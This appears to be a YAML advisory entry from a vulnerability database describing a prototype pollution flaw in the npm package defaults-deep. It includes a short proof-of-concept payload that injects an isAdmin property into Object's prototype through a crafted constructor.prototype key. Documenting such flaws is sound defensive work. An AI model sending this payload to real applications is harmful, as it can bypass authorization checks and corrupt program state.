- id: snykio:npm:defaults-deep:173661
  title: Prototype Pollution
  description: |
    [defaults-deep][1] is a like extend but recursively copies only the
    missing properties/values to the target object.

    Affected versions of this package are vulnerable to Prototype Pollution.
    Provided certain input `defaults-deep` can add or modify properties of
    the `Object` prototype. These properties will be present on all objects.

    \##PoC

        var defaultsDeep = require('defaults-deep');
        var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
        defaultsDeep({}, payload);
        console.log({}.isAdmin); // true



    [1]: https://github.com/jonschlinkert/defaults-deep
  affected_package: defaults-deep
  vulnerable_versions:
